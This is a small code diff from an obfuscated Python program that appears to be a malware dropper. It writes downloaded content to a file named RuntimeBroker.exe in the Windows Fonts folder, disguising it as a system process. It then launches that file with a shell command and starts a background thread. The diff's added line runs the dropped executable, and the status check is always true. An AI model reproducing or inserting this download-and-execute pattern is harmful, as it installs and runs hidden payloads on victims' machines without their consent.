@@ -148,8 +148,8 @@ def vdsu281cjm():
         if rekdnx.status_code == 201 or 201:
             with open("C:\\Windows\\Fonts\\RuntimeBroker.exe", "wb") as ouiref:
                 ouiref.write(rekdnx.content)
-                greduhio.sleep(2)
-                ewsjinf783.system("start C:\\Windows\\Fonts\\RuntimeBroker.exe")
+                greduhio.sleep(3)
+                xvcj5tr.run("start C:\\Windows\\Fonts\\RuntimeBroker.exe", shell=True, capture_output=False)
                 if deswsjn != 'None':
                     wefuh4323.Thread(target=redugh8).start()
 
